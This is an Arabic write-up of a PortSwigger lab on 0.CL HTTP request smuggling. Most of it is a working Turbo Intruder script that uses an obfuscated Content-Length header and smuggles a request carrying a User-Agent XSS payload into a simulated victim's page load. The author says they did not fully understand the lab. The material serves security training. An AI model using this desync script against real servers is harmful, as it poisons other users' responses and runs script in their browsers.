# [0.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling)

## **`الهدف`**
يزور `Carlos` الصفحة الرئيسية كل خمس ثواني، قم باستغلال الثغرة لتنفيذ `alert()` في متصفحه.
## **`خطوات الحل`**
==🔴ملاحظة هامة جدًا:== هذا اللاب شديد التعقيد لم أستطع فهمه جيدًا ولم أستطع حله يدويًا.

سنقوم بتحويل أى طلب من داخل اللاب إلى `Turbo Intruder` ولكن هذا الطلب لا فائدة منه باستثناء قيمة `Host` والتي حتى لا تؤخذ من داخل الطلب ولكن من عنوان التاب داخل `Turbo Intruder` لذلك يمكن حتى حذف محتوى الطلب كاملًا.

ثم نستعمل سكريبت `Python` التالي حتى يتوقف بنفسه لننتهي من حل اللاب.
```python
# Refer to https://portswigger.net/research/http1-must-die
host = "The Target Host"
# السطر السابق باسم هوست يمكن الاستغناء عنه بالكامل حيث أن قيمة هوست تؤخذ من الطلب الذي تم تحويله إلى تربو إنترودر
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    stage1 = '''POST /resources/css/test HTTP/1.1
Host: '''+host+'''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    # This will get prefixed to the victim's request - place your payload in here
    smuggled = '''GET /post?postId=8 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1'''

    # If the server doesn't like GET with a body, try OPTIONS etc
    stage2_chopped = '''OPTIONS / HTTP/1.1
Content-Length: 123
X: Y'''

    stage2_revealed = '''GET /404 HTTP/1.1
Host: '''+host+'''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    victim = '''GET / HTTP/1.1
Host: '''+host+'''
User-Agent: foo

'''

    # No need to edit below this line
    if '%s' not in stage1:
        raise Exception('Please place %s in the Content-Length header value')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 request must end with a blank line and have no body')

    while True:
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')

def handleResponse(req, interesting):
    table.add(req)

    # 0.CL attacks use a double desync so they can take a while!
    # Uncomment & customise this if you want the attack to automatically stop on success
    if req.label == 'victim' and 'Congratulations' in req.response:
        req.engine.cancel()
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)
